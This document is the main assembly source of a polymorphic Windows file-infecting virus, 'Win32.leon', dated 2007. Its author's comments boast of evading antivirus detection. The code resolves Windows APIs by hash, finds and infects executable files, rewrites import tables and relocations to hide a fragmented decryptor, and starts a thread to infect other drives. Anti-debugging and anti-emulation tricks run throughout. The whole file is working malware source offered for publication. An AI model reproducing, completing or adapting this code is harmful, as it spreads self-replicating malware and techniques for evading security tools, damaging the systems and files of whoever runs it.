   ;FICHIER : main.asm
   ;NOM     : Win32.leon
   ;DATE    : 14/01/2007
   ;VERSION : 1.0
   ;AUTEUR  : kaze <kaze@lyua.org>
   ;SITE    : http://fat.next-touch.com



   ; I'm happy to introduce to you win32.leon, a nearly original poly virus. This virus is
   ; mainly focused on AV-detection evading, so don't expect ultral33t spreading. The main
   ; technique of this is virus is "decryption via APIS", i.e the decryptor is (with a
   ; probability of 4/5) 100% api based. Some random fake api calls are also used in the
   ; decryptor: those apis are called with random arguments, but won't disturb the virus's
   ; excecution: they just return an error code (except when being debugged where they
   ; sometimes throw exceptions). Random api calls are also used in the virus body in order
   ; to avoid dynamic detection.
   ; A lot of little tricks are also used to fool emulators and scanners (like encryption
   ; through relocations, or decryptor fragementation) and are explained in the article
   ; stored at http://fat.next-touch.com/data/win32.leon.pdf (french only for now).

   ;===== WIN32.LEON =========================================================================
   ; OS:           Win2000 and WinXP. Successfully tested on both. Won't work on vista because
   ;               of the fake apis thingie.
   ; TYPE:         PE Appender.
   ; TARGETS:      Kaze*.exe PE files, with .code > ~10k and
   ;               vsize(lastsection)<rawsize(lastsection)
   ; INFECTION:    Insert virus body into last section. The decryptor is cut into X part, where
   ;               X=number of api calls in the decryptor. Those parts are written in the .code
   ;               section at random locations. The first part is located on the EP. If the
   ;               decryptor used is api-based, the IAT of the host will also be modified by the
   ;               virus. If encryption via relocs is used, relocations are modified and the
   ;               host is relocated by the virus.
   ; SPREADING:    Infect current directory and all physical drives. Avoid infection of
   ;               SFC protected files.
   ; POLY/META:    Polymorphic, using a kpasm-generated poly engine (rules in regles.kpasm).
   ;               Use two decryptors (one at a time): a cryptoapis-based one and a simple
   ;               xor loop.
   ; ANTIDBG:      Yes. The decryptor and the virus body use a lot of "fake apis", i.e some
   ;               apis with random arguments, that's won't do anything normally, but will
   ;               throw some exception when debugged.
   ; ANTIEMUL:     Yes. The decryptor is mainly composed of api calls. Most of the emulators
   ;               don't emulate them all. Bogus api calls are also used (fake apis) in order
   ;               to fool the emulator. The control flow in the decryptor is also a bit
   ;               obfuscated: in order to jump from the K part to the K+1 part
   ;               (in the decryptor), the emulator has to know the exact number of arguments
   ;               of the api used in the K part. Up to 500 different fake apis could be used.
   ; ANTISCAN:     Yes. Besides the poly, the virus sometimes uses encryption via
   ;               relocations: the decryptor itself is encrypted by having some relocations
   ;               pointing to the decryptor's code. The imagebase is modified to force windows
   ;               to relocate the infected host (and so decrypt the decryptor). Relocations
   ;               of the host are nulled and the host itsef is relocated by the virus.
   ; ANTIDYNAMIC:  Yes. The sequence of the apis used by the virus body and the decryptor is
   ;               random. Each virus api call is surrounded by up to 10 random fake apis calls.
   ; ANTIHEURIST:  No. It may fool some but no original trick used.
   ; BUGS:         Will crash every ~50 infections (don't ask me why). When crashing, the virus
   ;               try to restore control to infected program through SEH.
   ;==========================================================================================

   ; Well, this virus has been finished in hurry, so some things could be improved. The poly
   ; engine for example is good, but could be easily improved. The payload also is a simple
   ; MessageBox: I coded a nice one (some animated monkey playing around with desktop's icons :),
   ; but hadn't time to integrate it into the virus. Just look at the web site for the payload,
   ; it's quite fun :D. I sent it to AVers three weeks ago, and only 3 detect it, but with a bad
   ; ratio (<70%). I think that's because they just don't care, it's a PoC after all. Well,
   ; i'll publish it anyway.

   ; Thankz to:
   ;   - Baboon for the help with kpasm debugging
   ;   - Poco for hosting this file
   ;   - Squallsurf for the Vista VM
   ;   - Silma for the motivation.
   ;   - Tuna for the reading & correction of the paper
   ;
   ;And Greetz to all #fat,#nas and #uct members

   .386p
   .model flat,STDCALL

   ;===================================== MACROS =================================

   call_ macro x
           mov [ebp+sauve_reg_anti_call],edx
           mov [ebp+sauve_reg_anti_call2],ebx
           mov edx,[ebp+x]
           call anti_call
           mov edx,[ebp+sauve_reg_anti_call]
           mov ebx,[ebp+sauve_reg_anti_call2]
   endm

   call_s macro x
           call [ebp+x]
   endm


   debug macro x
           pusha
           mov eax,x
           call printdec
           popa
   endm

   debuga macro x
           pusha
           push 0
           push x
           push x
           push 0
           call_ MessageBox
           popa
   endm

   ;======================================= EQUS =================================

   TAILLE_IMPORTS          EQU 8092    ;devrait suffire pour la plupart des hôtes (env 50 dlls)
                                       ;doit etre alignee sur 4k!
   TAILLE_API              EQU 64
   NB_DLLS_IMPORTEES       EQU 1
   FIRST_GEN_IMAGE_BASE    EQU 400000h
   DECRYPTOR_SIZE          EQU 4096*4    ;decrypteur polymorphisé
   MUTATED_DECRYPTOR_SIZE  EQU 4096      ;pseudo-code modifié
   VIRTUAL_SIZE_VIRUS      EQU (((virus_len+heap_len + TAILLE_IMPORTS)/4096)+1)*4096+DECRYPTOR_SIZE
   MAX_NB_PARTIES          EQU 16        ;nombre max de parties pour le décrypteur
   PARTIE_MAX_SIZE         EQU DECRYPTOR_SIZE/MAX_NB_PARTIES
   MAX_OPCODE_PAR_PARTIE   EQU 20        ;sic
   OPCODE_MAX_SIZE         EQU PARTIE_MAX_SIZE/MAX_OPCODE_PAR_PARTIE
   NB_CASES_MEMOIRE        EQU 100       ;nombre de cases mémoires à réserver pour le poly

   PROV_RSA_FULL           EQU 1
   CRYPT_NEWKEYSET         EQU 8
   CRYPT_VERIFYCONTEXT     EQU 0F0000000h
   CALG_RC4                EQU 06801h
   CALG_MD5                EQU 08003h
   TAILLE_CLE              EQU 800000h

   PAGE_EXECUTE_READWRITE  EQU 040h

   SECTION_MASK            EQU 0C0000040h ;0F0000060h
   SLEEPTIME_ON_INFECT_DIR EQU 1000
   MAX_ENDROITS_INTERDIT   EQU 512
   MAX_RETRY               EQU 50          ;nombre max d'essais pour trouver des trous dans l'hote

   ;!! MAX_APIS_IMPORTEES*TAILLE_API*2 < TAILLE_IMPORTS/2
   MAX_APIS_IMPORTEES      EQU MAX_REAL_APIS_IMPORTEES + MAX_FAKE_APIS_IMPORTEES +8
   MAX_REAL_APIS_IMPORTEES EQU 5
   MAX_FAKE_APIS_IMPORTEES EQU 20

   SIGNATURE_VIRUS         EQU 54

   PROB_DECRYPTEUR_SIMPLE  EQU 5

   PROBA_ENCRYPTION_RELOCS EQU 5
   NB_RELOCS_PAR_ILOT      EQU 80  ;multiple de 32bits !
   IMAGEBASE_DEFAUT        EQU 10000h

   ;==================================== FIRST GEN DATA ==========================

   extrn ExitProcess:PROC
   extrn MessageBoxA:PROC


   .data

   Signature db "Win32.Leon   coded by kaze",0


   ;======================================= CODE =================================
   .code

   start:
   debut_virus:

   ;======================================= CORPS ================================
   encrypt_cryptoapised_stuff:
           call delta
   delta:  pop ebp
           sub ebp,offset delta

   ; sauvegarde quelques variables
           lea esi,[ebp+a_sauvegarder]
           lea edi,[ebp+sauvegarde]
           mov ecx,taille_sauvegarde
           rep movsb


   ;reequilibrage de la pile
           mov eax,[ebp+nb_fake_pushs]
           shl eax,2
           add esp,eax

   ; cherche l'adresse de kernel32
   find_kernel:
           mov edx,[esp]
           mov ecx,100h
           xor eax,eax
           and dx,word ptr 0F000h

           call seh
   seh_handler:
           mov esp,[esp+8]
           mov ebx,[esp+4]
           mov fs:[eax],ebx
           jmp find_it
   seh:
           push dword ptr fs:[eax]
           mov fs:[eax],esp
   find_it:
           sub edx,1000h
           dec ecx
           jz k32_not_found
           cmp word ptr [edx],'ZM'
           jnz find_it
           mov ebx,[edx+03ch]
           add ebx,edx
           cmp word ptr [ebx],'EP'
           jnz find_it
           pop dword ptr fs:[eax]
           pop eax

   ;récupère les apis de k32
           lea esi,[ebp+liste_apis_k32]            ;apis de k32
           lea edi,[ebp+apis_k32]
           call find_apis


   ;met en place le seh
           call seh_virus
   seh_handler_virus:
           mov esp,[esp+8]
           mov ebx,[esp+4]
           mov fs:[eax],ebx
           call delta3
   delta3: pop ebp
           sub ebp, offset delta3
           jmp retour_hote
   seh_virus:
           xor eax,eax
           push dword ptr fs:[eax]
           mov fs:[eax],esp


   ;alloue la memoire
           lea esi,[ebp+a_allouer]
           lea edi,[ebp+variables_allouees]
           mov ecx,nb_a_allouer
   l_alloue:
           push esi edi ecx
           lodsd
           push eax
           push dword ptr 0
           call_s LocalAlloc
           pop ecx edi esi
           test eax,eax
           jz retour_hote
           stosd
           loop l_alloue

   ;obligatoire pour les fake apis dynamiques
           call anti_call_init

   ;recupere l'adresse des autres apis
           lea eax,[ebp+name_user32]               ;apis de user32
           push eax
           call_ LoadLibrary
           mov edx,eax
           lea esi,[ebp+liste_apis_u32]
           lea edi,[ebp+apis_u32]
           call find_apis

           lea eax,[ebp+name_a32]               ;apis de advapi32
           push eax
           call_ LoadLibrary
           mov edx,eax
           lea esi,[ebp+liste_apis_a32]
           lea edi,[ebp+apis_a32]
           call find_apis

           and [ebp+calc_chksum],dword ptr 0       ;CheckSumMappedFile (optionnel)
           lea eax,[ebp+name_imagehlp]
           push eax
           call_ LoadLibrary
           test eax,eax
           jz no_image_help

           lea ebx,[ebp+imagehlp_api]
           push ebx
           push eax
           call_ GetProcAddress
           mov [ebp+calc_chksum],eax

   no_image_help:
           and [ebp+sfc_protected],dword ptr 0     ;SfcIsfileProtected (optionnel)
           lea eax,[ebp+name_sfc]
           push eax
           call_ LoadLibrary
           test eax,eax
           jz no_sfc
           lea ebx,[ebp+sfc_api]
           push ebx
           push eax
           call_ GetProcAddress
           mov [ebp+sfc_protected],eax
   no_sfc:


   ;================================ LANCEMENT DES THREADS =======================

           call [ebp+GetTickCount]
           mov [ebp+poly_rand_seed],eax
           mov [ebp+RAND_SEED],eax


   ;infecte le rep courant
           call infect_rep

   ;payload
           call payload

   ;================================= RETOUR A L'HOTE ============================

   retour_hote:
           test ebp,ebp
           jz retour_hote_prem_gen
           call restaure_hote
   retour_hote_prem_gen:
   ;lance la thread qui ifnecte tous les disques
           lea esi,[ebp+infecte_disques]
           call make_thread

           jmp [ebp+sauve_ancien_ep]

   k32_not_found:
           jmp k32_not_found




   ;======================================= FONCTIONS ============================


   include poly_defines.inc
   include poly_assembleur.asm
   include polymorphisation.asm
   include fragmentation.asm
   include fusion_imports.asm
   include fake_apis.asm
   include payload.asm
   include relocation.asm
   include infection.asm

   ;INFECTE_PE     in: eax--> PE mappé en memoire
   ;               out : none
   infecte_pe proc near
           pusha
           mov edx,[eax+3Ch]
           add edx,eax                             ;edx-->PE Header
           mov ebx,eax                             ;ebx=file mapping offset

           ;reinit quelques trucs
           xor eax,eax
           mov edi,[ebp+adresses_interdites]
           stosd
           mov [ebp+offset locations],dword ptr eax

           ;cherche la dernière section
           mov [edx+0B0h],eax                       ;marque d'infection
           lea esi,[edx+18h]
           movzx ecx, word ptr [edx+14h]           ;SizeOfOptionalHeader
           add esi,ecx                             ;esi-->sections
           movzx ecx,word ptr [edx+06h]
   cherche_derniere_sec:
           cmp [esi+12],eax
           jb ch2
           mov eax,[esi+12]
           mov edi,esi
   ch2:    add esi,28h
           loop cherche_derniere_sec

           mov ecx,[edi+8]                         ;ecx=VSize
           cmp ecx,[edi+16]
           ja infecte_pe_fin                       ;si vsize>rawsize infecte pas

           call encryption_relocs_init

           ;les modifs d'usage
           mov ecx,[edx+28h]                       ;entry point (rva)
           add ecx,[ebp+imagebase]                 ;entry point(va)
           mov [ebp+ancien_ep],ecx
                                                   ;edi-->header derniere section (en ram)
           add eax,[edi+8]                         ;ajoute VSize (eax etait = a RVA section)
           mov [ebp+infection_rva],eax
           add eax,[ebp+imagebase]
           mov [ebp+virus_start_va],eax

           mov esi,[edi+20]                        ;RawAddress
           add esi,[edi+8]                         ;VirtualSize
           add esi,ebx                             ;adresse du filemapping
           mov [ebp+infection_raw],esi

           mov eax,[ebp+taille_virus_alignee]
           add [edi+8],dword ptr VIRTUAL_SIZE_VIRUS
           add [edi+16],eax                               ;RawSize
           or [edi+36],SECTION_MASK

           ;remplit la table des adresse interdites
           call evite_adresses

           ;choisit un décrypteur parmis les deux dispos
           call poly_choisit_decrypteur
           xor eax,eax
           cmp [ebp+poly_name_dll],eax
           jz detourne_pas_iat

           ;modifie l'iat pour importer les apis du decrypteur + les fake apis
           mov eax,[edx+80h]       ;RVA de l'IAT
           call rva2raw
           mov esi,eax
           add esi,ebx             ;esi=raw imports
           mov ecx,[edx+84h]       ;ecx=size imports
           mov edi,[ebp+infection_raw]  ;edi=raw addresse du virus (pas encore le code à ce niveau là, mais l'iat)

           call imports_init       ;détourne l'iat
           mov eax,[ebp+poly_name_dll]
           call add_iid_decrypteur ;ajoute le iid
           lea esi,[ebp+iat_crypto_decrypteur]
           call deal_imports       ;importe les apis + les fake apis du dll
   detourne_pas_iat:

           ;cherche les fake apis (des autres dll) importées par l'hote
           lea esi,[ebp+liste_fake_apis]
           lea edi,[ebp+fake_apis]
           call find_fake_apis
           mov [ebp+nb_fake_apis],eax

           ;pseudo-poly le decrypteur (ajoute des fake apis calls)
           movzx eax,byte ptr [ebp+poly_nb_parties_decrypteur]
           mov edi,[ebp+mutated_pseudo_decrypteur]
           mov esi,[ebp+poly_decrypteur]
           call poly_pseudo_polymorphize
           ;poly_nb_parties_decrypteur modifié

           ;trouve X plages d'adresse de MAX_PARTIE_SIZE octets que l'on peut overwriter
           push ebx
           mov ebx,PARTIE_MAX_SIZE
           movzx ecx,byte ptr [ebp+poly_nb_parties_decrypteur]
           call trouve_adresses                ;trouve poly_nb_parties_decrypteur endroits de PARTIE_MAX_SIZE octets chacuns
           pop ebx
           test eax,eax
           jz infecte_pas
           call sauvegarde_hote

           ;assemble et ecrit le decrypteur aux endroit maintenant sauvegardes
           mov esi,[ebp+mutated_pseudo_decrypteur]
           call poly_polymorphise

           ;encryption via les relocs
           call encryption_relocs


           ;ecrit le code du virus
           mov edi,[ebp+infection_raw]
           add edi,TAILLE_IMPORTS + DECRYPTOR_SIZE     ; edi = raw adresse du code du virus
           push edi
           lea esi,[ebp+debut_virus]
           mov ecx,virus_len
           rep movsb
           pop edi

           ;encrypte le code du virus
           call [ebp+fonction_encryption]

   infecte_pas:
           add [edx+50h],dword ptr VIRTUAL_SIZE_VIRUS
           mov ecx,[ebp+calc_chksum]
           jecxz infecte_pe_fin               ;si CheckSumpMappedFile non present ...
           lea esi,[ebp+checksum]
           push esi
           lea eax,[esi+4]
           push eax
           push dword ptr [ebp+WFD_nFileSizeLow]
           push ebx
           call ecx
                                           ;eax--> PE_Header mappé en RAM
           mov ecx,[esi]
           mov [eax+58h],ecx               ;enregistre la nouvelle checksum
   infecte_pe_fin:
           popa
           ret
   infecte_pe endp



   ;RVA2RAW :      in :  eax=rva ,edx-->pe_header
   ;               out : eax=raw adress
   rva2raw proc near
           push esi
           push ebx
           push ecx
           lea esi,[edx+18h]
           movzx ecx,word ptr [edx+14h]            ;SizeOfOptionalHeader
           add esi,ecx                             ;esi-->sections
           movzx ecx,word ptr [edx+06h]
   cherche_sec2:
           mov ebx,[esi+12]
           cmp ebx,eax
           ja ch4
           add ebx,[esi+8]
           cmp [esi+8],dword ptr 0
           jnz vsize_ok
           add ebx,[esi+16]           ;raw size
   vsize_ok:
           cmp ebx,eax
           ja found2
   ch4:    add esi,28h
           loop cherche_sec2
   found2: mov ebx,[esi+12]
           sub eax,ebx
           add eax,[esi+20]
           pop ecx
           pop ebx
           pop esi
           ret
   rva2raw endp


   ;SECTION_INFO : in :  eax=rva ,edx-->pe_header
   ;               out : eax--> section header
   section_info proc near
           push esi
           push ecx
           push ebx
           lea esi,[edx+18h]
           movzx ecx, word ptr [edx+14h]           ;SizeOfOptionalHeader
           add esi,ecx                             ;esi-->sections
           movzx ecx,word ptr [edx+06h]
   cherche_sec:
           or [esi+36],SECTION_MASK
           mov ebx,[esi+12]
           cmp ebx,eax
           ja ch3
           add ebx,[esi+8]
           cmp [esi+8],dword ptr 0
           jnz vsize_ok2
           add ebx,[esi+16]            ; raw size
   vsize_ok2:
           cmp ebx,eax
           ja found
   ch3:    add esi,28h
           loop cherche_sec
   found:
           mov eax,esi
           pop ebx
           pop ecx
           pop esi
           ret
   section_info endp

   ;CHECK_INFECTION : check si l'hote a déjà été visité
   ; in : edx--> PE header
   ; out : ecx!=0 si deja infecté
   check_and_set_infection proc near
       mov ecx,[edx+8]     ;timestamp
       cmp ch,SIGNATURE_VIRUS
       jz deja_infecte
       mov ch,SIGNATURE_VIRUS
       mov [edx+8],ecx
       xor ecx,ecx
   deja_infecte:
       ret
   check_and_set_infection endp

   ;IS_SFC : check si sfc protected
   ;in : ebx->filename
   ;out: ecx!= si sfc protected
   is_sfc proc near
       push eax edx esi edi
       xor ecx,ecx
       push ecx
       lea eax,[ebp+Buffer]
       push eax
       push dword ptr 260
       push ebx
       call_ GetFullPathName

       push dword ptr 260*2
       lea eax,[ebp+Buffer2]
       push eax
       xor eax,eax
       dec eax
       push eax
       lea eax,[ebp+Buffer]
       push eax
       xor eax,eax
       push eax
       push eax
       call_ MultiByteToWideChar

       lea eax,[ebp+Buffer2]
       push eax
       xor eax,eax
       push eax
       call [ebp+sfc_protected]
       mov ecx,eax
       pop edi esi edx eax
       ret
   is_sfc endp

   ;INFECTION :    in : ebx--> Filename, WFD rempli avec un .exe
   ;               out : none
   infection proc near
           pusha
           push 80h                ;ATTRIB_NORMAL
           push ebx
           call_ SetFileAttributes

   ;teste si SFC
           cmp [ebp+sfc_protected],dword ptr 0
           jz pas_sfc_api
           call is_sfc
           test ecx,ecx
           jnz pasbon
   pas_sfc_api:
           xor eax,eax
           push eax
           push eax
           push 3
           push eax
           inc eax
           push eax
           push 0C0000000h
           push ebx
           call_ CreateFile
           inc eax
           jz peuxpas
           dec eax
           mov [ebp+Fhandle],eax

           mov edi,[ebp+WFD_nFileSizeLow]
           call create_mapped_file
           test eax,eax
           jz mappas
           mov [ebp+Mhandle],eax
           call map_file                   ; eax=map_offset
           test eax,eax
           jz veuxpas
           mov esi,[eax+3Ch]
           cmp esi,edi
           jae pasbon                      ;si pas PE, evite les violation de pages
           add esi,eax
           cmp dword ptr [esi],'EP'
           jnz pasbon

           cmp dword ptr [esi+84h],TAILLE_IMPORTS/2+NB_DLLS_IMPORTEES*14h
           jae pasbon
           mov edx,esi

           call check_and_set_infection
           test ecx,ecx
           jnz pasbon

           mov ecx,[esi+34h]
           mov [ebp+imagebase],ecx
           mov esi,[esi+3Ch]                 ;File Alignement

           push eax
           call_ UMVOFile
           push [ebp+Mhandle]
           call_ CloseHandle

           xor edx,edx
           mov eax,virus_len+TAILLE_IMPORTS+DECRYPTOR_SIZE       ;edi=fichier+virus
           div esi
           inc eax
           mul esi
           mov [ebp+taille_virus_alignee],eax
           add edi,eax
           call create_mapped_file
           mov [ebp+Mhandle],eax
           call map_file           ; eax=map_offset

           call infecte_pe

   pasbon: push eax
           call_ UMVOFile
   veuxpas:push [ebp+Mhandle]
           call_ CloseHandle
   mappas: push [ebp+Fhandle]
           call_ CloseHandle
   peuxpas:push dword ptr [ebp+WFD_dwFileAttributes]
           push ebx
           call_ SetFileAttributes
           popa
           ret
   infection endp



   ;FIND_APIS: in: esi--> ckecksums(terminé par -1) edi--> apis[] edx=HMODULE*
   ;           out: edi[] rempli
   find_apis proc near
           mov ebx,[edx+3ch]
           add ebx,edx                     ; ebx--> PE Header
           mov ecx,[ebx+78h]
           add ecx,edx                     ; ecx--> export table
           mov eax,[ecx+01ch]              ; sauve les adresses des tables
           add eax,edx
           lea ebx,[ebp+lst_fnc]           ; liste des adresses de fonctions
           mov [ebx],eax
           add ebx,4
           mov eax,[ecx+24h]               ; liste des ordinals
           add eax,edx
           mov [ebx],eax
           mov ebx,[ecx+20h]               ; ebx-->liste des noms
           xor ecx,ecx
           add ebx,edx
   fa1:    mov eax,[ebx+ecx*4]
           add eax,edx
           call calc_crc
           cmp eax,[esi]                   ; est-ce la fonction recherchée ?
           jz fa2
           inc ecx
           jmp fa1
   fa2:    push esi
           mov esi,[ebp+lst_ord]           ; choppe l'ordinal (marche en //)
           movzx eax,word ptr [esi+ecx*2]
           mov esi,[ebp+lst_fnc]           ; et on s'en sert pour chopper l'adresse de l'api
           mov eax,[esi+eax*4]
           add eax,edx                     ; (RVA)
           stosd                           ; on la stock
           pop esi
           inc ecx
           add esi,4                       ; api suivante
           inc dword ptr [esi]             ; esi==0xFFFFFFF ?
           jz fa3
           dec dword ptr[esi]
           jmp fa1
   fa3:    dec dword ptr[esi]
           ret
   find_apis endp

   ;CALC_CRC: in: eax--> apiname
   ;          out: eax=crc
   calc_crc proc near
           push ecx
           push esi
           mov esi,eax
           xor eax,eax
           sub ecx,ecx
   cc1:    lodsb
           test al,al
           jz cc2
           add cl,al
           rol eax,cl
           add ecx,eax
           jmp cc1
   cc2:    mov eax,ecx
           pop esi
           pop ecx
           ret
   calc_crc endp

   ;INFECT_REP     in : none
   ;               out : none
   infect_rep proc near
           pusha
           lea esi,[ebp+WFD]
           lea eax,[ebp+mask]      ;.exe
           test ebp,ebp
           jnz pas_premiere_gen
           lea eax,[ebp+mask_pg]   ;kaze*.exe
   pas_premiere_gen:
           push esi
           push eax
           call_ FindFirstFile
           inc eax
           jz badrep
           dec eax
           mov [ebp+Shandle],eax
   unautreverre?:
           lea ebx,[ebp+WFD_szFileName]
           mov ecx,[ebp+sfc_protected]
           jecxz bypass_sfc
           ; TODO : sfc check
   bypass_sfc:
           call infection
   pas_touche:
           lea eax,[ebp+WFD]
           push eax
           push [ebp+Shandle]
           call_ FindNextFile
           test eax,eax            ;dernier fichier ?
           jnz unautreverre?
           push [ebp+Shandle]
           call_ FindClose
   badrep:
           popa
           ret
   infect_rep endp

   ;MAP_FILE :     in: edi=taille
   ;               out: none
   map_file proc near
           xor     eax,eax
           push    edi
           push    eax
           push    eax
           push    00000002h
           push    [ebp+Mhandle]
           call_    MVOFile
           ret
   map_file         endp

   ;CREATE_MAPPED_FILE :   in : edi=taille
   ;                       out : none
   create_mapped_file proc near
           xor eax,eax
           push eax
           push edi
           push eax
           push 00000004h
           push eax
           push [ebp+Fhandle]
           call_ CreateFileMapping
           ret
   create_mapped_file endp

   make_thread proc near           ;esi--> debut de la thread
           pusha
           xor edx,edx
           lea eax,[ebp+vtmp1]
           push eax
           push edx
           lea eax,[ebp+vtmp2]
           push eax
           push esi
           push edx
           push edx
           call [ebp+CreateThread]
           popa
           ret
   make_thread endp

   fin_dyn_fake_apis:
   ;======================================= DATA =================================

   a_allouer:
                   dd DECRYPTOR_SIZE
                   dd MUTATED_DECRYPTOR_SIZE
                   dd MAX_ENDROITS_INTERDIT*2*4
                   dd XOR_LOOP_SIZE
   nb_a_allouer equ ($-offset a_allouer)/4

   a_sauvegarder:
   ancien_ep       dd offset first_gen
   imagebase       dd FIRST_GEN_IMAGE_BASE
   a32_oft         dd 0
   a32_ft          dd 0
   locations       dd MAX_NB_PARTIES*2+1 dup (0)
   infection_rva   dd 0
   poly_nb_parties_decrypteur  db 0
   fake_apis               dd 2*NB_FAKE_APIS dup (?)
   nb_fake_apis            dd ?
   taille_sauvegarde equ $ - a_sauvegarder

   RAND_SEED       dd 45980131

   signature       db "win32.leon by kaze",0
   disque          db "B:\",0
   dmask           db "*",0
   dotdot          db "..",0
   mask            db "kaze*.exe",0
   mask_pg         db "kaze*.exe",0
   name_user32     db 'user32.dll',0
   name_imagehlp   db 'imagehlp.dll',0
   imagehlp_api    db 'CheckSumMappedFile',0
   name_sfc        db 'sfc.dll',0
   sfc_api         db 'SfcIsFileProtected',0
   name_a32        db 'ADVAPI32.DLL',0
   msg             db 'Infecté',0

   nb_fake_pushs   dd 0        ; pour reequilibrer la pile
   cle_anti_call   db 35h


   liste_apis_k32:
           dd 0FDBE9DDFh           ; CloseHandle
           dd 04B00FBA1h           ; CreateFileA
           dd 00D6EA22Eh           ; CreateFileMappingA
           dd 0BE307C51h           ; CreateThread
           dd 04E5DE044h           ; ExitThread
           dd 0BE7B8631h           ; FindClose
           dd 0C915738Fh           ; FindFirstFileA
           dd 08851F43Dh           ; FindNextFileA
           dd 028F8C6FBh           ; GetCurrentDirectoryA
           dd 09C3A5210h           ; GetDriveTypeA
           dd 06B1C08DAh           ; GetFullPathNameA
           dd 040BF2F84h           ; GetProcAddress
           dd 08FAF830Bh           ; GetTickCount
           dd 05D0915E3h           ; GetWindowsDirectoryA
           dd 095765835h           ; LoadLibraryA
           dd 01064BF83h           ; LocalAlloc
           dd 032BEDDC3h           ; MapViewOfFile
           dd 09588EE13h           ; MultiByteToWideChar
           dd 08E0E5487h           ; SetCurrentDirectoryA
           dd 050665047h           ; SetFileAttributesA
           dd 03A00E23Bh           ; Sleep
           dd 0FAE00D65h           ; UnmapViewOfFile
           dd 0065F101Ah           ; VirtualProtect
           dd 0FFFFFFFFh

   liste_apis_u32:
           dd 0C0059B5Fh           ; MessageBoxA
           dd 0FFFFFFFFh

   liste_apis_a32:
           dd 0B4060931h           ; CryptAcquireContextA
           dd 08320BDFEh           ; CryptCreateHash
           dd 01437CBF2h           ; CryptDecrypt
           dd 09BB3B145h           ; CryptDeriveKey
           dd 0A6889767h           ; CryptEncrypt
           dd 0C66A7A58h           ; CryptHashData
           dd 0FFFFFFFFh

   code_to_crypt_len equ ($ - debut_virus)

   memoire:
       dd NB_CASES_MEMOIRE   dup (0)
   virus_len equ ($ - debut_virus)


   ;======================================= BSS ==================================
   align dword
   ; KERNEL32.DLL
   apis_k32:
   CloseHandle             dd ?
   CreateFile              dd ?
   CreateFileMapping       dd ?
   CreateThread            dd ?
   ExitThread              dd ?
   FindClose               dd ?
   FindFirstFile           dd ?
   FindNextFile            dd ?
   GetCurrentDirectory     dd ?
   GetDriveType            dd ?
   GetFullPathName         dd ?
   GetProcAddress          dd ?
   GetTickCount            dd ?
   GetWindowsDirectory     dd ?
   LoadLibrary             dd ?
   LocalAlloc              dd ?
   MVOFile                 dd ?
   MultiByteToWideChar     dd ?
   SetCurrentDirectory     dd ?
   SetFileAttributes       dd ?
   Sleep                   dd ?
   UMVOFile                dd ?
   VProtect                dd ?

   ; USER32.DLL
   apis_u32:
   MessageBox              dd ?

   ; ADVAPI32.DLL
   apis_a32:
   CAcquireContextA        dd ?
   CCreateHash             dd ?
   CDecrypt                dd ?
   CDeriveKey              dd ?
   CEncrypt                dd ?
   CHashData               dd ?



   ;DIVERS
   lst_fnc                 dd ?
   lst_ord                 dd ?
   lst_noms                dd ?
   Fhandle                 dd ?
   Mhandle                 dd ?
   Shandle                 dd ?

   WFD label   byte
   WFD_dwFileAttributes    dd ?
   WFD_ftCreationTime      dd ?
                           dd ?
   WFD_ftLastAccessTime    dd ?
                           dd ?
   WFD_ftLastWriteTime     dd ?
                           dd ?
   WFD_nFileSizeHigh       dd ?
   WFD_nFileSizeLow        dd ?
   WFD_dwReserved0         dd ?
   WFD_dwReserved1         dd ?
   WFD_szFileName          db 260 dup (?)
   WFD_szAlternateFileName db 13 dup (?)
                           db 03 dup (?)

   SavedDirectory          db 260 dup (?)

   Buffer                  db 260 dup (?)
   Buffer2                 db 260*2 dup (?)

   infection_raw           dd ?
   virus_start_va          dd ?

   iat_noms_apis_rva       dd ?
   iat_noms_apis_raw       dd ?

   taille_virus_alignee    dd ?
   sfc_protected           dd ?
   calc_chksum             dd ?

   checksum                dd ?
   old_checksum            dd ?

   fonction_encryption     dd ?
   poly_decrypteur         dd ?
   poly_name_dll           dd ?
   poly_liste_apis_compat  dd ?
   poly_nb_apis_compat     dd ?
   poly_buffer             db 256 dup (?)

   simple_cle              dd ?

   vtmp1                   dd ?
   vtmp2                   dd ?
   vtmp3                   dd ?
   vtmp4                   dd ?

   index_iat               dd MAX_APIS_IMPORTEES dup (?)

   relocated_imagebase     dd ?
   is_relocated            db 0
   ;=================== VARIABLES SAUVEGARDEES =================
   sauvegarde:
   sauve_ancien_ep         dd ?
   sauve_imagebase         dd ?
   s_a32_oft               dd ?
   s_a32_ft                dd ?
   sauve_locations         dd MAX_NB_PARTIES*2+1 dup (?)
   sauve_infection_rva     dd ?
   sauve_nb_parties        db ?

   ; FAKE APIS
   sauve_fake_apis         dd 2*NB_FAKE_APIS dup (?)
   sauve_nb_fake_apis      dd ?

   ; FUSION IMORTS


   ;=================== VARIABLES ALLOUEES =================
   variables_allouees:
   decrypteur              dd ?
   mutated_pseudo_decrypteur      dd ?
   adresses_interdites     dd ?
   xor_loop_location       dd ?
   heap_len equ ($ - debut_virus) - virus_len





   ;================= PREMIERE GENERATION ==================




   first_gen:
           mov eax,virus_len
           call printdec
           call ExitProcess,0

   printdec proc near              ;c vite-fait ...
           pusha
           cld
           lea edi,buf
           mov ebx,10
           xor ecx,ecx
   GUI_printdec_1:
           xor edx,edx
           div ebx
           push edx
           inc ecx
           test eax,eax
           jnz GUI_printdec_1
   GUI_prindec_2:
           pop eax
           add eax,48
           stosb
           loop GUI_prindec_2
           xor eax,eax
           stosb
           push eax
           push offset Signature
           push offset buf
           push eax
           call MessageBoxA
           popa
           ret
   printdec endp
   buf db 20 dup (?)

   end start
